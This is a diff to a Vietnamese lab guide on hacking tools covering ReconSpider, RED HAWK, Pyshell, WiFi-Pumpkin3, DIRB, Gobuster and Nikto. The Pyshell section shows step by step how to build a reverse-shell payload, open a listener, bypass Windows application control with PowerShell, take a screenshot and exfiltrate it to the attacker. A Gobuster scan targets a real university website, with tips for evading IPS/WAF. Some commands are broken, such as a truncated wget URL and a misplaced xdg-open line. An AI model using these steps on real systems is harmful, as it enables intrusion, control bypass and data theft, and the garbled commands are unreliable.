@@ -578,6 +578,7 @@ https://www.youtube.com/watch?v=8VO3zDDVeig
 ##### Kiểm tra trên Windows
 
 Mở:
+xdg-open target_screenshot.png
 
 ```text
 http://neverssl.com
@@ -984,28 +985,198 @@ export PYTHONPATH="$PWD"
 python3 reconspider.py
 ```
 
-#### IP 
+##### IP 
 
 Module `IP` dùng để thu thập thông tin công khai liên quan đến một địa chỉ IP public.
 
 Thông tin có thể gồm:
 
-- Địa chỉ IP
-- Quốc gia
-- Mã quốc gia
-- Khu vực
-- Thành phố
-- Tọa độ gần đúng
-- Múi giờ
+- IP
+- Country
+- Country Code
+- Region
+- City
+- Latitude
+- Longitude
+- Timezone
 - ASN
-- ISP hoặc tổ chức quản lý
+- Organization
+- ISP
 
 ![IP](hinhanh/IP.png)
 
-#### Domain
+Kiểm tra IP public bằng https://whatismyipaddress.com 
+##### Domain
+
+Thu thập thông tin công khai của tên miền
+
+```bash
+Reconspider >> 2
+HOST (URL / IP) >> google.com
+PORT >> 443
+```
+
+Lúc này có thể chọn các chức năng như:  
+
+```text
+1. ReverseIP
+2. SubDomain
+3. nsLookup
+4. CMSDetect
+5. PortScan
+6. Bruteforce
+7. ClickJacking
+8. CORS
+9. Host Header Injection
+10. Header
+11. Crawler
+12. Whoami
+99. Exit
+```
+
+##### Phonenumber
+
+Phân tích thông tin cơ bản của số điện thoại
+
+```text
+Reconspider >> 3
+PHONE NUMBER (with CountryCode example) >> +84SDTVIETNAM
+[+] Fetching Phonenumber Details...
+
+Number: 84SDTVIETNAM
+Type: mobile
+CountryCode: VN
+Country: Viet Nam (Socialist Republic of)
+Location: 
+Carrier: Viettel Corp.
+```
+
+##### DNS MAP
+
+Dùng để thu thập các bản ghi DNS của 1 tên miền 
+
+Các loại bản ghi phổ biến
+
+```text
+A
+AAAA
+MX
+NS
+TXT
+CNAME
+SOA
+```
+
+##### METADATA
+
+Xem được thông tin trích xuất được nhúng bên trong file
+
+Kết quả với GIF có thể chỉ gồm:
+
+```text
+Format
+Width
+Height
+Color Mode
+Number of Frames
+```
+
+Để có thể kiểm tra meta chi tiết, nên sử dụng: 
 
 
-### RED HAWK
+```text
+JPG
+PNG
+PDF
+DOCX
+```
+
+##### REVERSE IMAGE SEARCH
+
+Module hỗ trợ tìm nguồn hoặc vị trí xuất hiện của một hình ảnh trên Internet.
+
+Ứng dụng:
+
+```text
+Tìm nguồn gốc hình ảnh
+Phát hiện ảnh bị sử dụng lại
+Tìm website chứa ảnh tương tự
+Kiểm tra ảnh giả mạo
+```
+
+Sẽ có 2 kết quả xảy ra khi chạy module này:
+
+```text
+
+Trường hợp 1: Có URL kết quả
+
+```text
+[+] Result URL: https://www.google.com/search?...
+```
+
+ReconSpider sẽ cố mở trang kết quả trên trình duyệt.
+
+Trường hợp 2: Không có redirect
+
+```text
+The search service did not return a redirect URL
+Opening Google Lens
+```
+
+Google Lens sẽ được mở và người dùng tải ảnh lên thủ công.
+
+Trường hợp 3: File không tồn tại
+
+```text
+ERROR : File Does not Exist
+```
+
+##### MAC ADDRESS LOOKUP
+
+Tra cứu nhà sản xuất thiết bị dựa vào phần OUI của địa chỉ MAC.
+
+
+Ví dụ MAC:
+
+```text
+00:1A:2B:3C:4D:5E
+```
+
+Ba byte đầu:
+
+```text
+00:1A:2B
+```
+
+được gọi là OUI và thường xác định nhà sản xuất card mạng.
+
+##### Username
+
+Module `USERNAME` tìm username trên các mạng xã hội.
+
+Các nền tảng trong công cụ:
+
+```text
+1. Facebook
+2. Twitter
+3. Instagram
+```
+
+Kết quả có thể gồm
+
+```text
+Domain
+Breached Email Count
+Breach Source
+Breach Date
+Compromised Services
+```
+
+##### MAIL BREACH
+
+Kiểm tra tên miền có xuất hiện trong các nguồn rò rỉ email công khai hay không
+
+##### RED HAWK
 
 RED HAWK là công cụ thu thập thông tin website được viết bằng PHP. Công cụ hỗ trợ kiểm thử bảo mật.
 
@@ -1062,3 +1233,401 @@ RED HAWK giúp người kiểm thử:
 - Chuẩn bị dữ liệu cho các bước kiểm thử tiếp theo.
 
 ![Red hawk](hinhanh/QuetWebsite.png)
+
+## Pyshell
+
+Phương thức tấn công khai thác lỗ hổng hoặc sử dụng công cụ mã nguồn mở PyShell để thực thi mã từ xa (Remote Code Execution - RCE) hoặc chèn lệnh trái phép trên máy chủ mục tiêu thông qua môi trường Python.
+
+Payload được tạo có thể chứa các chức năng như:
+
+```text
+Kết nối ngược về máy Kali
+Nhận lệnh từ xa
+Thực thi lệnh hệ thống
+Quét mạng bằng Nmap
+Chụp màn hình
+Truyền file
+```
+
+#### Khởi động Pyshell
+
+Vào thư mục HackingTool:
+
+```bash
+cd ~/hacking-lab/hackingtool
+```
+
+Kích hoạt môi trường ảo:
+
+```bash
+source .venv/bin/activate
+```
+
+Vào thư mục Pyshell:
+
+```bash
+cd Pyshell
+```
+
+Khởi động Pyshell từ menu HackingTool hoặc file gọi tương ứng.
+
+Khi xuất hiện:
+
+```text
+[*] User@Pyshell :~
+```
+
+nghĩa là Pyshell đã khởi động thành công.
+
+Cấu hình Pyshell
+
+Nhập lần lượt:
+
+```text
+set host 192.168.0.228
+set port 4444
+set name pyshell
+show options
+```
+
+Kết quả:
+
+```text
+Your Host     : 192.168.0.228
+Your Port     : 4444
+Session Name  : pyshell
+```
+
+---
+
+#### Tạo payload
+
+Trong Pyshell:
+
+```text
+make
+```
+
+Payload được lưu trong:
+
+```text
+/home/kali/hacking-lab/hackingtool/Pyshell/payloads/pyshell
+```
+
+Kiểm tra:
+
+```bash
+cd ~/hacking-lab/hackingtool/Pyshell
+
+file payloads/pyshell
+ls -lh payloads/pyshell
+head -n 5 payloads/pyshell
+```
+
+Kết quả:
+
+```text
+Python script, ASCII text executable
+```
+
+Payload dùng Python 2:
+
+```python
+#!/usr/bin/env python2
+```
+
+#### Khởi tạo trình lắng nghe trên máy Kali Linux
+Mở công cụ điều khiển trên máy tấn công để chuẩn bị đón kết nối ngược từ mục tiêu:
+```bash
+python3 pyshell_target.py
+```
+Tại menu cấu hình của công cụ, thiết lập thông số và kích hoạt chế độ chờ:
+```bash
+show options
+run
+```
+*Hệ thống chuyển sang trạng thái: `[+] Wait The Victim ..` và hiển thị `[+] Connected ..` khi mục tiêu kích hoạt file.*
+
+Đồng bộ hóa và cài đặt thư viện trên máy mục tiêu
+Do payload yêu cầu các module bổ sung nhưng hệ thống mục tiêu chưa nhận diện, thực hiện cài đặt trực tiếp vào phân vùng thực thi của Python 3 tại dòng lệnh `>>>>`:
+```cmd
+python -m pip install --target="C:\Users\admin\AppData\Local\Python\pythoncore-3.14-64\Lib\site-packages" requests python-nmap pyscreenshot
+```
+
+#### Khắc phục lỗi chính sách bảo mật bằng PowerShell
+
+Khi lệnh chụp ảnh bằng thư viện Python bị chặn bởi cơ chế *Application Control Policy*, chuyển sang sử dụng API đồ họa gốc của Windows thông qua PowerShell để bypass thiết bị phòng thủ:
+```cmd
+powershell -c "[Reflection.Assembly]::LoadWithPartialName('System.Drawing'); [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); \(bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \)bmp = New-Object Drawing.Bitmap(bounds.Width, bounds.Height); \(graphics = [Drawing.Graphics]::FromImage(\)bmp); graphics.CopyFromScreen(bounds.Location, [Drawing.Point]::Empty, bounds.Size); bmp.Save('C:\Users\admin\AppData\Local\Temp\screen.png', [Drawing.Imaging.ImageFormat]::Png)"
+```
+Kiểm tra trạng thái tồn tại của tệp tin vừa chụp:
+```cmd
+powershell -c "Test-Path C:\Users\admin\AppData\Local\Temp\screen.png"
+```
+*Kết quả trả về: `True` (Tệp tin ảnh đã được ghi nhận vào bộ nhớ tạm).*
+
+#### Di chuyển tệp tin vào vùng chia sẻ công khai
+Đưa tệp tin ảnh từ thư mục ẩn `Temp` về thư mục hiện hành của người dùng (`Downloads`) để chuẩn bị cho quá trình trích xuất thông tin:
+```cmd
+copy C:\Users\admin\AppData\Local\Temp\screen.png C:\Users\admin\Downloads\screen.png
+```
+#### Thiết lập cổng nhận dữ liệu trên máy tấn công (Kali)
+Mở một cửa sổ Terminal mới trên Kali Linux, thiết lập một HTTP Server cục bộ tại cổng `8080` để làm điểm trung chuyển tải file:
+```bash
+python3 -m http.server 8080
+```
+
+#### Trích xuất tệp tin về máy tấn công không lỗi cấu trúc
+Mở trình duyệt web hoặc sử dụng lệnh tải xuống an toàn trên một Terminal khác của máy Kali để kéo file ảnh nguyên bản về mà không bị lẫn mã độc hay tiêu đề mạng (HTTP Headers):
+```bash
+wget http://192.168.0 -O ketqua_screenshot.png
+```
+
+#### Xác nhận kết quả thu thập
+Mở và kiểm tra tính toàn vẹn của hình ảnh màn hình đã trích xuất thành công:
+```bash
+xdg-open ketqua_screenshot.png
+```
+
+## WiFi-Pumpkin3
+
+**WiFi-Pumpkin3** là một framework kiểm thử bảo mật mạng không dây, cho phép Kali Linux tạo một Access Point để các thiết bị trong môi trường lab kết nối vào.
+
+Có thể thực hiện:
+
+```text
+Tạo Access Point
+Cấp địa chỉ IP bằng DHCP
+Theo dõi client kết nối
+Hiển thị hostname, IP và MAC
+Quản lý interface Wi-Fi
+Chạy các plugin và proxy
+```
+
+WiFI-Pumpkin3 được sử dụng để:
+
+```text
+Phát mạng Wi-Fi
+Cho máy Windows kết nối
+Cấp địa chỉ IP bằng DHCP
+Kiểm tra danh sách client
+Quan sát trạng thái Access Point
+```
+
+Khởi động WiFi-Pumpkin3
+
+Trước tiên, nếu không có USB wifi, ngắt wifi hiện tại: 
+
+```bash
+sudo nmcli device disconnect wlan0
+```
+
+Dừng NetworkManager:
+
+```bash
+sudo systemctl stop NetworkManager
+```
+
+Dừng `wpa_supplicant` nếu interface vẫn bị chiếm:
+
+```bash
+sudo pkill -f wpa_supplicant
+```
+
+Đặt lại interface:
+
+```bash
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type managed
+sudo ip link set wlan0 up
+```
+
+Cấu hình Access Point
+
+Tại giao diện `wp3 >`, chọn interface:
+
+```text
+wp3 > set interface wlan0
+```
+
+Đặt tên mạng Wi-Fi:
+
+```text
+wp3 > set ssid WP3
+```
+
+Đặt kênh phát:
+
+```text
+wp3 > set channel 1
+```
+
+Có thể sử dụng một trong các kênh phổ biến của băng tần 2.4 GHz:
+
+```text
+1
+6
+11
+```
+Kiểm tra lại cấu hình:
+
+```text
+wp3 > ap
+```
+
+Khởi động Access Point 
+
+Chạy:
+
+```text 
+wpa > start
+```
+
+Lên Windows, kết nối wifi tới WP3
+
+Sau khi Windows kết nối vào mạng `WP3`, mở CMD và kiểm tra địa chỉ IP:
+
+```cmd
+ipconfig
+```
+
+Kết quả cần thấy:
+
+```text
+IPv4 Address    : 10.0.0.x
+Default Gateway : 10.0.0.1
+```
+
+Quay lại WiFi-Pumpkin3 và kiểm tra client:
+
+```text
+wp3 > clients
+```
+
+Có thể kiểm tra thêm trạng thái AP:
+
+```text
+wp3 > ap
+wp3 > jobs
+```
+
+Nếu Windows xuất hiện trong danh sách client, Access Point và DHCP đã hoạt động thành công.
+
+Dừng WiFi-Pumpkin3:
+
+```text
+wp3 > stop
+wp3 > exit
+```
+
+Khôi phục Wi-Fi trên Kali:
+
+```bash
+sudo systemctl restart NetworkManager
+sudo systemctl restart wpa_supplicant
+sudo nmcli radio wifi on
+```
+
+> Lưu ý: lệnh khởi động đúng là `wp3 > start`, không phải `wpa > start`.
+
+## DIRB – Quét đường dẫn và thư mục website
+
+**DIRB** là công cụ dùng để tìm các thư mục, file hoặc tài nguyên web đang tồn tại trên máy chủ nhưng không được hiển thị trực tiếp trên giao diện website.
+
+DIRB hoạt động bằng cách đọc từng từ trong một wordlist, ghép từ đó vào URL mục tiêu rồi gửi yêu cầu HTTP để kiểm tra.
+
+Chaỵ DIRB:
+
+```bash
+
+Enter Url >>
+
+Ở đây bạn nhập URL trang web mà bạn muốn check, ở đây sử dụng website tự tạo để test
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jul 22 04:09:24 2026
+URL_BASE: http://192.168.0.171:8000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.0.171:8000/ ----
++ http://192.168.0.171:8000/admin (CODE:301|SIZE:0)                                                     
++ http://192.168.0.171:8000/backup (CODE:301|SIZE:0)                                                    
++ http://192.168.0.171:8000/images (CODE:301|SIZE:0)                                                    
++ http://192.168.0.171:8000/index.html (CODE:200|SIZE:238)                                              
++ http://192.168.0.171:8000/uploads (CODE:301|SIZE:0)                                                   
+
+```
+
+## Gobuster – Quét thư mục và file website
+
+**Gobuster** là công cụ dùng để tìm các thư mục, file và đường dẫn ẩn trên website bằng wordlist.
+
+Để quét website, sử dụng chế độ `dir`:
+
+```bash
+gobuster dir \
+-u https://lms.dlu.edu.vn \
+-w /usr/share/wordlists/dirb/common.txt \
+-t 10 \
+-k
+```
+
+- -t 10: Giới hạn số luồng (threads) xuống còn 10 (mặc định của Gobuster). Quét các trang web thật nên để tốc độ chậm để tránh làm nghẽn mạng hoặc bị hệ thống phòng thủ (IPS/WAF) khóa IP ngay lập tức.
+
+- -k: Bỏ qua việc kiểm tra chứng chỉ SSL/TLS. Tham số này giúp lệnh không bị lỗi nếu chứng chỉ HTTPS của trang web có vấn đề hoặc bị cấu hình sai.
+
+website sau khi được quét:
+```bash
+admin                (Status: 301) [Size: 730] [--> https://lms.dlu.edu.vn/admin/]
+analytics            (Status: 301) [Size: 730] [--> https://lms.dlu.edu.vn/analytics/]
+auth                 (Status: 301) [Size: 730] [--> https://lms.dlu.edu.vn/auth/]
+backup               (Status: 301) [Size: 730] [--> https://lms.dlu.edu.vn/backup/]
+```
+S
+## Nikto – Quét cấu hình web server
+
+**Nikto** là công cụ dùng để kiểm tra cấu hình, phiên bản phần mềm, file nguy hiểm và các thiết lập bảo mật trên web server.
+
+Quét website lab:
+
+```bash
+nikto -h http://192.168.0.171:8000
+```
+
+Nikto phát hiện website thiếu các HTTP security header:
+
+```text
+Strict-Transport-Security
+Referrer-Policy
+Content-Security-Policy
+Permissions-Policy
+X-Content-Type-Options
+```
+
+Ý nghĩa:
+
+```text
+Strict-Transport-Security
+→ Yêu cầu trình duyệt sử dụng HTTPS
+
+Referrer-Policy
+→ Kiểm soát thông tin URL được gửi sang website khác
+
+Content-Security-Policy
+→ Hạn chế nguồn script và nội dung được phép tải
+
+Permissions-Policy
+→ Giới hạn quyền sử dụng camera, microphone và vị trí
+
+X-Content-Type-Options
+→ Ngăn trình duyệt tự đoán kiểu nội dung của file
+```
+
